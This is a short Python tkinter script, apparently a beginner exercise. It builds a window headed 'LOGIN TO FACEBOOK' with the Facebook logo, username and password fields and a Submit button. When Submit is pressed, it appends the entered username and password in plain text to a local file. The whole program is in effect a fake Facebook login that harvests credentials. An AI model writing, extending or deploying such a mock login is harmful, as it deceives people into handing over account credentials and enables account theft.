from tkinter import *
from PIL import Image,ImageTk

def getval():
    # print(f"Username is {userval.get()} and Password is {passwoed.get()}")
    f=open("file.txt","a")
    f.write(f"\nUsername is {userval.get()} and Password is {passwoed.get()}")
    f.close()

root=Tk()
root.geometry("400x300")

root.title("by Vishaal")
# #canvas
# canvas_width=800
# canvas_height=500
# root.geometry(f"{canvas_width}x{canvas_height}")
#
# can_widg=Canvas(root,width=canvas_width,height=canvas_height)
# can_widg.grid()
# can_widg.create_rectangle(0,0,300,400,fill="#00ffff")



titl=Label(text="LOGIN TO FACEBOOK")
user=Label(text="USERNAME")
passwoed=Label(text="PASSWORD")
titl.grid(row=2,column=1)
user.grid(row=5,column=0)
passwoed.grid(row=6,column=0)

userval=StringVar()
passwoed=StringVar()

userentry=Entry(root,textvariable=userval).grid(row=5,column=1)
passentry=Entry(root,textvariable=passwoed).grid(row=6,column=1)

button=Button(root,text="Submit",command=getval).grid(row=8,column=1)

check=Checkbutton(text="confirm").grid(row=7,column=1)

getimage=Image.open("FB.jpg")
photo=ImageTk.PhotoImage(getimage)

imageLabel=Label(image=photo).grid(row=0,column=1)

root.mainloop()
